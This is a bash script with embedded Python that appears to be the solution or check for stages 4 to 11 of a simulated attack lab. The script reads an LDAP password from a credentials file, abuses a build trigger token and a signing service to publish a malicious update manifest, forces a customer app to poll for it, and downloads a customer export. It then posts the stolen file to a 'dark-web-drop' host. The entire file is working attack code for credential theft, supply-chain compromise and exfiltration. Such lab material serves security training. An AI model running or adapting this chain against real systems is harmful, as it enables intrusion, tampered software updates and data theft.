#!/usr/bin/env bash
set -euo pipefail

docker compose exec -T support-portal python - <<'PY'
import base64
import json
import urllib.error
import urllib.request
from pathlib import Path


def request(method, url, payload=None, headers=None):
    body = None
    merged = dict(headers or {})
    if payload is not None:
        body = json.dumps(payload).encode()
        merged["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=body, headers=merged, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            data = res.read().decode()
            ctype = res.headers.get("Content-Type", "")
            return json.loads(data) if "json" in ctype else data
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode(errors="replace")
        raise SystemExit(f"{method} {url} failed: {exc.code} {detail}") from exc


creds = {}
for line in Path("/var/lab/config/ldap_creds.conf").read_text().splitlines():
    if "=" in line:
        key, value = line.split("=", 1)
        creds[key] = value
auth = base64.b64encode(f"operator:{creds['LDAP_BIND_PW']}".encode()).decode()
headers = {"Authorization": f"Basic {auth}"}

print(request("GET", "http://wiki:6000/page/devops-onboarding", headers=headers)[:160])
ticket = request("GET", "http://ticket-service:7001/tickets/OES-1287")
repo = request("GET", "http://source-repo:7002/files/release-pipeline/release.json")
release = repo["content"]

job = request("POST", "http://build-server:7003/api/jobs", {
    "repo": release["repo"],
    "ref": release["ref"],
    "channel": release["channel"],
    "trigger_token": release["build_trigger_token"],
})
artifact = request("GET", "http://build-server:7003/api/artifacts/art-demo-001")
canonical = {
    "product": "EchoAgent",
    "channel": "anrc",
    "version": "2.6.4",
    "build_id": artifact["build_id"],
    "artifact": {
        "name": artifact["name"],
        "sha256": artifact["sha256"],
        "url": "http://updates.release.local/artifacts/" + artifact["name"],
        "size_bytes": artifact["size_bytes"],
    },
    "metadata": {"customer": "anrc", "lab_marker": artifact["marker"], "ticket": ticket["id"]},
}
signature = request("POST", "http://signing-service:7005/api/sign", {"canonical_manifest": canonical})["signature"]
manifest = dict(canonical)
manifest["signature"] = signature
request("POST", "http://update-server:7004/internal/publish", {"channel": "anrc", "manifest": manifest})
request("GET", "http://update-server:7004/channels/anrc/manifest.json")
request("POST", "http://customer-app:7007/api/poll-now")
request("GET", "http://customer-api:7006/metadata")
request("GET", "http://customer-api:7006/facilities")
request("GET", "http://customer-api:7006/audits")
request("GET", "http://customer-api:7006/exports")
detail = request("GET", "http://customer-api:7006/exports/exp-2026-Q2-007")
final_object = request("GET", detail["presigned_url"])
drop = request("POST", "http://dark-web-drop:7009/drop/submit", {
    "filename": "project-orion-echo-final.txt",
    "export_id": detail["id"],
    "object_key": detail["object_key"],
    "file_content": final_object,
})
request("GET", "http://dark-web-drop:7009/drop/status/" + drop["submission_id"])
print(json.dumps({"completed": True, "submission_id": drop["submission_id"]}, indent=2))
PY

curl -sS http://localhost:29100/status | grep -q '"stage11_dark_web_drop"'
echo "[stage4-11] PASS: real internal chain completed through controlled dark web drop"
